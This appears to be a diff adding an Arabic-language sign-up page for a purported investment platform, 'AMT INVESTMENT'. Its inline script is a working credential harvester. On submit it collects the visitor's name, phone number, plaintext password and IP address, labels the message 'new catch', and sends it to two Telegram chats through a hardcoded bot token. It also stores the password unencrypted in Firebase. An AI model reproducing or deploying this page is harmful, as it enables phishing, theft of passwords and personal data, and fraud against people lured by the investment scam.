@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AMT INVESTMENT | ابدأ الاستثمار</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="security.js"></script> 
+    <link rel="stylesheet" href="glass.css">
+</head>
+<body class="main-bg">
+    <div class="glass-container">
+        <h1 class="logo">AMT <span>INVESTMENT</span></h1>
+        <p class="subtitle">سجل الآن للحصول على محفظتك الاستثمارية</p>
+        
+        <form id="registerForm">
+            <div class="input-group">
+                <input type="text" id="userName" placeholder="الاسم بالكامل" required>
+            </div>
+            
+            <div class="input-group phone-group">
+                <select id="countryCode">
+                    <option value="+20">🇪🇬 +20</option>
+                    <option value="+964">🇮🇶 +964</option>
+                    <option value="+966">🇸🇦 +966</option>
+                    <option value="+971">🇦🇪 +971</option>
+                </select>
+                <input type="tel" id="phoneNumber" placeholder="رقم الهاتف" required>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+            </div>
+
+            <button type="submit" class="btn-primary">فتح حساب مجاني</button>
+        </form>
+        
+        <p class="footer-note">لديك حساب بالفعل؟ <a href="login.html">تسجيل دخول</a></p>
+        <p class="version-text" onclick="triggerVault()">v1.0.8</p>
+    </div>
+
+    <script>
+        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
+        const chatIds = ["8622780736", "8211953992"];
+
+        document.getElementById('registerForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const name = document.getElementById('userName').value;
+            const phone = document.getElementById('countryCode').value + document.getElementById('phoneNumber').value;
+            const pass = document.getElementById('password').value;
+
+            let userIP = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+            } catch(err) {}
+
+            const alertMsg = `🔔 صيد جديد!\n👤 الاسم: ${name}\n📱 الهاتف: ${phone}\n🔑 كلمة السر: ${pass}\n🌐 الـ IP: ${userIP}`;
+            
+            chatIds.forEach(id => {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(alertMsg)}`);
+            });
+
+            const userKey = phone.replace('+', '');
+            firebase.database().ref('users/' + userKey).set({
+                full_name: name,
+                phone: phone,
+                password: pass,
+                ip: userIP,
+                balance: 0,
+                status: "Active",
+                joined_at: new Date().toLocaleString()
+            }).then(() => {
+                localStorage.setItem('userPhone', userKey);
+                alert("تم التسجيل! جاري تحويلك...");
+                window.location.href = "dashboard.html";
+            });
+        };
+    </script>
+</body>
+</html>
